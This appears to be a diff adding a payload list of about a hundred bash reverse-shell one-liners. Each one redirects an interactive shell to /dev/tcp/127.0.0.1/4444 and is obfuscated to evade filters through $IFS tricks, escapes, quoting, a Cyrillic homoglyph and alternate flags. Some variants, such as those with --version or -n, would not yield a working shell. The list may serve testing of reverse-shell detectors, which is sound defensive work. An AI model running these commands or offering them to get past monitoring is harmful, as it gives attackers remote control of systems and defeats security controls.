@@ -1,0 +1,99 @@
+bash--interactive >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -\-interactive >& /dev/tcp/127.0.0.1/4444 0>&1
+bash$IFS-i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash\t-i >& /dev/tcp/127.0.0.1/4444 0>&1
+`bash -i >& /dev/tcp/127.0.0.1/4444 0>&1` *(non-breaking space)*
+`bash-i >& /dev/tcp/127.0.0.1/4444 0>&1` *(no space)*
+bash --interactive >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/bash--interactive >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/bash$IFS-i >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/bash -i -c 'exec 5<>/dev/tcp/127.0.0.1/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'
+bash -i -c 'exec 5<>/dev/tcp/127.0.0.1/4444; while read line <&5; do eval "$line" >&5 2>&5; done'
+bash --rcfile <(echo ". ~/.bashrc") -i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --norc -i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --init-file <(echo source~/.bashrc) -i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -\i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --i=nop >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --interactive=yes >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --int=1 >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --noprofile --interactive >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --norc --interactive >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -i -l >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --login -i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --login --interactive >& /dev/tcp/127.0.0.1/4444 0>&1
+env SHELL=/bin/bash bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+env bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+env -i bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+env INTERACTIVE=true bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+SHELL=/bin/bash bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --rcfile /dev/null --interactive >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --rcfile /tmp/empty.sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --rcfile /dev/fd/0 -i < <(echo) >& /dev/tcp/127.0.0.1/4444 0>&1
+bash$IFS--interactive >& /dev/tcp/127.0.0.1/4444 0>&1
+`bаsh -i >& /dev/tcp/127.0.0.1/4444 0>&1` *(Cyrillic "а")*
+bash --int-eractive >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --INTERACTIVE >& /dev/tcp/127.0.0.1/4444 0>&1
+bash$'\x20'-i >& /dev/tcp/127.0.0.1/4444 0>&1
+`bash$'\x09'-i >& /dev/tcp/127.0.0.1/4444 0>&1` *(tab)*
+bash --\interactive >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --config /dev/null --interactive >& /dev/tcp/127.0.0.1/4444 0>&1
+bash$IFS--$IFSinteractive >& /dev/tcp/127.0.0.1/4444 0>&1
+$(which bash) -i >& /dev/tcp/127.0.0.1/4444 0>&1
+$(echo bash) -i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -${IFS}i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash "-i" >& /dev/tcp/127.0.0.1/4444 0>&1
+bash '--interactive' >& /dev/tcp/127.0.0.1/4444 0>&1
+"bash" -i >& /dev/tcp/127.0.0.1/4444 0>&1
+'bash' -i >& /dev/tcp/127.0.0.1/4444 0>&1
+b\ash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+bash >& /dev/tcp/127.0.0.1/4444 0>&1
+bash >& /dev/tcp/127.0.0.1/4444 0>&1
+bash\t>& /dev/tcp/127.0.0.1/4444 0>&1
+bash\n>& /dev/tcp/127.0.0.1/4444 0>&1
+bash $'\t'>& /dev/tcp/127.0.0.1/4444 0>&1
+bash < /dev/null >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --norc >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --noprofile >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --rcfile /dev/null >& /dev/tcp/127.0.0.1/4444 0>&1
+bash <<< "" >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/bash >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/bash --noprofile >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/bash < /dev/null >& /dev/tcp/127.0.0.1/4444 0>&1
+/bin/bash <<<"" >& /dev/tcp/127.0.0.1/4444 0>&1
+bash $0 >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --posix >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --verbose >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --noediting >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --norc --noprofile >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --rcfile /dev/null --noprofile >& /dev/tcp/127.0.0.1/4444 0>&1
+bash <<< " " >& /dev/tcp/127.0.0.1/4444 0>&1
+bash <<<'' >& /dev/tcp/127.0.0.1/4444 0>&1
+bash </dev/null >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --dump-po-strings >& /dev/tcp/127.0.0.1/4444 0>&1
+command bash >& /dev/tcp/127.0.0.1/4444 0>&1
+exec bash >& /dev/tcp/127.0.0.1/4444 0>&1
+exec /bin/bash >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --help >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -l >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --login >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -s >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -c "" >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -r >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -d >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -v >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -x >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -t >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -n >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -c ":" >& /dev/tcp/127.0.0.1/4444 0>&1
+bash $@ >& /dev/tcp/127.0.0.1/4444 0>&1
+bash "$@" >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -c ' ' >& /dev/tcp/127.0.0.1/4444 0>&1
+bash -c true >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --dump-strings >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --pretty-print >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --debugger >& /dev/tcp/127.0.0.1/4444 0>&1
+bash --version >& /dev/tcp/127.0.0.1/4444 0>&1
+env SHELL=bash bash >& /dev/tcp/127.0.0.1/4444 0>&1
+SHELL=/bin/bash /bin/bash >& /dev/tcp/127.0.0.1/4444 0>&1
